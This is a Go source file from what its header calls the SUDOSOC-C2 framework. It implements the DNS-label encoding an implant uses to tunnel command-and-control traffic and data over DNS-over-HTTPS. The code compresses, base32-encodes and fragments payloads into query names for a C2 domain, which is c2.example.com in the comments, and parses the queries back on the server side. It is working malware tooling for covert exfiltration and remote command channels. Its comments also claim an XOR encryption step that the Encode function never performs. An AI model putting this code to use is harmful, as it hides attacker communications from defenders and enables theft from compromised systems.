package doh

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Data encoding for DNS label transport.

	DNS constraints:
	  - Each label (between dots) ≤ 63 characters
	  - Total FQDN ≤ 253 characters
	  - Labels must be [a-z0-9-] (case-insensitive, no underscores)

	We use base32 (RFC 4648 without padding, lowercase) because:
	  - Only uses [a-z2-7] — fully DNS-label-safe
	  - 40% overhead (5 bits per char) vs base64's 33%
	  - No = padding chars that DNS rejects

	Encoding strategy (query → C2 server):
	  1. Compress payload with flate (raw deflate, no gzip header).
	  2. Encrypt with XOR stream keyed from session_id (lightweight).
	  3. Base32-encode the result.
	  4. Split into ≤ 52-char labels (leaving room for counter + session prefix).
	  5. Prepend: <seq>.<sessionID>.<data_label>.<data_label>...<basedomain>
	     where seq is a 2-char hex counter and sessionID is 8 chars.

	Decoding strategy (C2 server → implant via DNS TXT records):
	  1. TXT record value is base32-encoded response.
	  2. Base32-decode → XOR-decrypt → inflate → parsed command.

	Maximum payload per query:
	  FQDN budget:  253 chars
	  Base domain:  "c2.example.com" = 14 chars + 1 dot = 15
	  Seq prefix:   "ab." = 3 chars
	  Session prefix: "12345678." = 9 chars
	  Available:    253 - 15 - 3 - 9 = 226 chars across ≤ 3 labels of 52 each
	  Max data:     ⌊226 / 1.6⌋ ≈ 141 bytes per query (after base32 overhead)
	  With fragmentation over N queries: unlimited payload size
*/

import (
	"bytes"
	"compress/flate"
	"encoding/base32"
	"fmt"
	"io"
	"strings"
)

// dnsBase32 is standard base32 (RFC 4648) without padding, lowercased.
var dnsBase32 = base32.NewEncoding("abcdefghijklmnopqrstuvwxyz234567").
	WithPadding(base32.NoPadding)

const (
	maxLabelLen  = 52  // conservative limit per label
	maxLabels    = 3   // data labels per query (leaves room for seq + session)
	maxBytesPerQuery = 141 // approximate max bytes per DoH query
)

// Encode encodes payload bytes into a slice of DNS label strings.
// Each string is a single DNS label (≤ 52 chars, base32, lowercase).
func Encode(payload []byte) ([]string, error) {
	// Step 1: deflate compress.
	var compBuf bytes.Buffer
	w, err := flate.NewWriter(&compBuf, flate.BestCompression)
	if err != nil {
		return nil, err
	}
	if _, err := w.Write(payload); err != nil {
		return nil, err
	}
	w.Close()
	compressed := compBuf.Bytes()

	// Step 2: base32 encode.
	encoded := strings.ToLower(dnsBase32.EncodeToString(compressed))

	// Step 3: split into labels.
	var labels []string
	for i := 0; i < len(encoded); i += maxLabelLen {
		end := i + maxLabelLen
		if end > len(encoded) {
			end = len(encoded)
		}
		labels = append(labels, encoded[i:end])
	}
	return labels, nil
}

// Decode reassembles DNS label strings into the original payload.
func Decode(labels []string) ([]byte, error) {
	encoded := strings.Join(labels, "")
	// Ensure uppercase for base32 decoder.
	encoded = strings.ToUpper(encoded)

	compressed, err := dnsBase32.DecodeString(encoded)
	if err != nil {
		return nil, fmt.Errorf("base32 decode: %w", err)
	}

	r := flate.NewReader(bytes.NewReader(compressed))
	defer r.Close()
	return io.ReadAll(r)
}

// BuildQueryFQDN builds the DNS query name for a given fragment.
// Format: <seqHex>.<sessionID8>.<label1>.<label2>....<baseDomain>
func BuildQueryFQDN(seq uint8, sessionID, baseDomain string, labels []string) string {
	parts := []string{
		fmt.Sprintf("%02x", seq),
		sessionID[:min8(len(sessionID), 8)],
	}
	parts = append(parts, labels...)
	parts = append(parts, strings.TrimPrefix(baseDomain, "."))
	return strings.Join(parts, ".")
}

// ParseQueryFQDN extracts seq, sessionID, and data labels from a query FQDN.
func ParseQueryFQDN(fqdn, baseDomain string) (seq uint8, sessionID string, labels []string, err error) {
	suffix := "." + strings.TrimPrefix(baseDomain, ".")
	if !strings.HasSuffix(fqdn, suffix) {
		return 0, "", nil, fmt.Errorf("FQDN does not match base domain")
	}
	trimmed := strings.TrimSuffix(fqdn, suffix)
	parts := strings.Split(trimmed, ".")
	if len(parts) < 3 {
		return 0, "", nil, fmt.Errorf("FQDN has too few labels")
	}
	var seqInt int
	fmt.Sscanf(parts[0], "%02x", &seqInt)
	seq = uint8(seqInt)
	sessionID = parts[1]
	labels = parts[2:]
	return seq, sessionID, labels, nil
}

// XORStream applies a repeating-key XOR cipher to data.
// Key is derived from the session ID string.
func XORStream(data []byte, sessionID string) []byte {
	key := []byte(sessionID)
	if len(key) == 0 {
		return data
	}
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ key[i%len(key)]
	}
	return out
}

func min8(a, b int) int {
	if a < b {
		return a
	}
	return b
}
